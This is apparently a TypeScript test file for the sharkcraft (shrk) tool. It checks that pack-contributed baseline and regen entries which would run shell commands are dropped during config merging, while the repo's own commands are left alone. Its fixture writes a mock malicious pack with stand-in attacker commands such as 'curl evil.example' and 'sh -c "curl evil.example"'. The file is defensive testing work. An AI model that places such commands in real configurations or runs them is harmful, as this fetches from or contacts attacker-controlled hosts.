/**
 * The pack-plane merge seam must never adopt a pack element that would make
 * shrk RUN a shell command.
 *
 * `baselines[].compute.run` and `generatedArtifacts[].regen` both spawn. A pack
 * ships code the repo did not write; letting it also ship a command that
 * `shrk baseline check` would then execute is the same hazard the existing
 * "pack-contributed verification commands are NOT auto-run" contract forbids.
 * The guarantee here is STRUCTURAL — enforced once at the seam, so no
 * downstream caller has to remember to re-check provenance.
 */
import { beforeEach, describe, expect, test } from 'bun:test';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import * as nodePath from 'node:path';
import { clearPackDiscoveryCache } from '@shrkcrft/packs';
import { resolveProjectConfig } from '../resolve-project-config.ts';

function makeWorkspace(): string {
  const root = mkdtempSync(nodePath.join(tmpdir(), 'shrk-r66-'));
  writeFileSync(
    nodePath.join(root, 'package.json'),
    JSON.stringify({ name: 'r66-workspace', version: '0.0.0' }),
  );
  const skDir = nodePath.join(root, 'sharkcraft');
  mkdirSync(skDir, { recursive: true });
  // The LOCAL config may declare a shell compute — this is the repo's own file.
  writeFileSync(
    nodePath.join(skDir, 'sharkcraft.config.ts'),
    `export default {
  baselines: [
    { id: 'local-cmd', baseline: 'b/local.json', compute: { kind: 'command', run: 'echo local' } },
  ],
};
`,
  );

  const packRoot = nodePath.join(root, 'node_modules/@r66/shell-pack');
  mkdirSync(packRoot, { recursive: true });
  writeFileSync(
    nodePath.join(packRoot, 'package.json'),
    JSON.stringify({
      name: '@r66/shell-pack',
      version: '1.0.0',
      sharkcraft: { manifest: './sharkcraft.plugin.ts' },
    }),
  );
  writeFileSync(
    nodePath.join(packRoot, 'sharkcraft.plugin.ts'),
    `export default {
  schema: 'sharkcraft.pack/v1',
  info: { name: '@r66/shell-pack', version: '1.0.0' },
  contributions: {
    baselineFiles: ['./baselines.ts'],
    generatedArtifactFiles: ['./generated.ts'],
  },
};
`,
  );
  // One command baseline (must be DROPPED) + one extractor baseline (must merge).
  writeFileSync(
    nodePath.join(packRoot, 'baselines.ts'),
    `export default [
  { id: 'pack-cmd', baseline: 'b/pack.json', compute: { kind: 'command', run: 'curl evil.example' } },
  { id: 'pack-extract', baseline: 'b/pack2.json', compute: { kind: 'extractor', source: { files: ['src/**/*.ts'], extract: 'export-names' } } },
];
`,
  );
  // One regen rule (must be DROPPED) + one header-only rule (must merge).
  writeFileSync(
    nodePath.join(packRoot, 'generated.ts'),
    `export default [
  { id: 'pack-regen', generatedGlob: ['gen/**/*.ts'], regen: 'sh -c "curl evil.example" {TMP}' },
  { id: 'pack-headers', generatedGlob: ['gen/**/*.ts'], provenanceHeader: { mustMatch: 'GENERATED' } },
];
`,
  );
  return root;
}

describe('pack-plane merge — shell-executing planes', () => {
  beforeEach(() => clearPackDiscoveryCache());

  test('a pack `command` baseline is dropped; its `extractor` sibling merges', async () => {
    const root = makeWorkspace();
    try {
      const resolved = await resolveProjectConfig(root);
      expect(resolved.ok).toBe(true);
      if (!resolved.ok) return;
      const ids = (resolved.value.config.baselines ?? []).map((b) => b.id).sort();
      expect(ids).toEqual(['local-cmd', 'pack-extract']);

      const note = resolved.value.planeDiagnostics.find((d) => d.includes('pack-cmd'));
      expect(note).toBeDefined();
      expect(note).toContain('never auto-run');
      expect(note).toContain('@r66/shell-pack');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('a pack `regen` rule is dropped; a header-only rule merges', async () => {
    const root = makeWorkspace();
    try {
      const resolved = await resolveProjectConfig(root);
      expect(resolved.ok).toBe(true);
      if (!resolved.ok) return;
      const ids = (resolved.value.config.generatedArtifacts ?? []).map((g) => g.id);
      expect(ids).toEqual(['pack-headers']);

      const note = resolved.value.planeDiagnostics.find((d) => d.includes('pack-regen'));
      expect(note).toContain('never auto-run');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("the repo's OWN command baseline is untouched — this is a pack guard, not a ban", async () => {
    const root = makeWorkspace();
    try {
      const resolved = await resolveProjectConfig(root);
      expect(resolved.ok).toBe(true);
      if (!resolved.ok) return;
      const local = (resolved.value.config.baselines ?? []).find((b) => b.id === 'local-cmd');
      expect(local?.compute.run).toBe('echo local');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
